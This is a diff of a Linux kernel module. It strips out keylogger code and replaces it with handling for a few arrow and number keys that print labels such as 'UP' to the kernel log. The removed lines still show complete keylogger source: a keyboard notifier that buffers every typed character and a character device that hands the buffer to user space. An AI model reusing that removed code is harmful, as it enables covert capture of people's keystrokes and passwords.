@@ -11,30 +11,25 @@
 #include <linux/notifier.h>
 
 // Module Info
-#define DEVICE_NAME "keylogger"  // The Device name for our Device Driver
-#define BUFFER_LEN 1024
+#define KEY_UP 		0xF603
+#define KEY_DOWN	0xF600
+#define KEY_RIGHT	0xF602
+#define KEY_LEFT	0xF601
+#define KEY_1		0xF031	
+#define KEY_2		0xF032
+#define KEY_3		0xF033
+#define KEY_4		0xF034
+#define KEY_ESC		0xF01B
+#define KEY_ENTER	0xF201
 
-// Keylogger Info
-static char keys_buffer[BUFFER_LEN];  // This buffer will contain all the logged keys
-static char *keys_bf_ptr = keys_buffer; 
-// Our buffer will only be of size 1024. If the user typed more that 1024 valid characters, the keys_buf_ptr would overflow
-int buf_pos = 0;  // buf_pos keeps track of the count of characters read to avoid overflows in kernel space
-static int major;  // The Major Number that will be assigned to our Device Driver
-
-
-// Prototypes
+// Prototype
 static void __exit keylog_exit(void);
 static int __init keylog_init(void);
-static ssize_t dev_read(struct file *, char __user *, size_t, loff_t *); // Device Driver read prototype
 static int keys_pressed(struct notifier_block *, unsigned long, void *); // Callback function for the Notification Chain
 
 module_init(keylog_init);
 module_exit(keylog_exit);
 
-// Setting the Device Driver read function
-static struct file_operations fops = {
-	.read = dev_read
-};
 
 // Initializing the notifier_block
 static struct notifier_block nb = {
@@ -45,58 +40,41 @@ static struct notifier_block nb = {
 static int keys_pressed(struct notifier_block *nb, unsigned long action, void *data) {
 	struct keyboard_notifier_param *param = data;
 	
-	// We are only interested in those notifications that have an event type of KBD_KEYSYM and the user is pressing down the key
-	if (action == KBD_KEYSYM && param->down) {
-		char c = param->value;
-		
-		// We will only log those key presses that actually represent an ASCII character. 
-		if (c == 0x01) {
-			*(keys_bf_ptr++) = 0x0a;
-			buf_pos++;
-		} else if (c >= 0x20 && c < 0x7f) {
-			*(keys_bf_ptr++) = c;
-			buf_pos++;
+	// We are only interested in certain keys
+	if (action == KBD_KEYSYM && param->down && param->shift == 0) {
+
+		if(param->value == KEY_UP) {
+			printk(KERN_ALERT "UP\n");
+		} else if(param->value == KEY_DOWN) {
+			printk(KERN_ALERT "DOWN\n");
+		} else if(param->value == KEY_LEFT) {
+			printk(KERN_ALERT "LEFT\n");
+		} else if(param->value == KEY_RIGHT) {
+			printk(KERN_ALERT "RIGHT\n");
+		} else if(param->value == KEY_1) {
+			printk(KERN_ALERT "Saved state 1\n");
+		} else if(param->value == KEY_2) {
+			printk(KERN_ALERT "Saved state 2\n");
+		} else if(param->value == KEY_3) {
+			printk(KERN_ALERT "Saved state 3\n");
+		} else if(param->value == KEY_4) {
+			printk(KERN_ALERT "Saved state 4\n");
+		}else if(param->value == KEY_ENTER) {
+			printk(KERN_ALERT "Starting sequence of moves\n");
+		} else if(param->value == KEY_ESC) {
+			printk(KERN_ALERT "Stopping sequence\n");
 		}
-		
-		// Beware of buffer overflows in kernel space!! They can be catastrophic!
-		if (buf_pos >= BUFFER_LEN) {
-			buf_pos = 0;
-			memset(keys_buffer, 0, BUFFER_LEN);
-			keys_bf_ptr = keys_buffer;
-		}
-	}	
+	}
 	return NOTIFY_OK; // We return NOTIFY_OK, as "Notification was processed correctly"
 }
 
-// Device driver read function
-static ssize_t dev_read(struct file *fp, char __user *buf, size_t length, loff_t *offset) {
-	int len = strlen(keys_buffer);
-	int ret = copy_to_user(buf, keys_buffer, len);
-	if (ret) {
-		printk(KERN_INFO "Couldn't copy all data to user space\n");
-		return ret;
-	}
-	memset(keys_buffer, 0, BUFFER_LEN); // Reset buffer after each read
-	keys_bf_ptr = keys_buffer; // Reset buffer pointer
-	return len;
-}
-
 static int __init keylog_init(void) {
-	major = register_chrdev(0, DEVICE_NAME, &fops);
-	if (major < 0) {
-		printk(KERN_ALERT "keylog failed to register a major number\n");
-		return major;
-	}
-	
-	printk(KERN_INFO "Registered keylogger with major number %d", major);	
-	
+	printk(KERN_ALERT "Keylogger loaded\n");
 	register_keyboard_notifier(&nb);
-	memset(keys_buffer, 0, BUFFER_LEN);
 	return 0;
 }
 
 static void __exit keylog_exit(void) {
-	unregister_chrdev(major, DEVICE_NAME);
 	unregister_keyboard_notifier(&nb);
 	printk(KERN_INFO "Keylogger unloaded\n");
 }
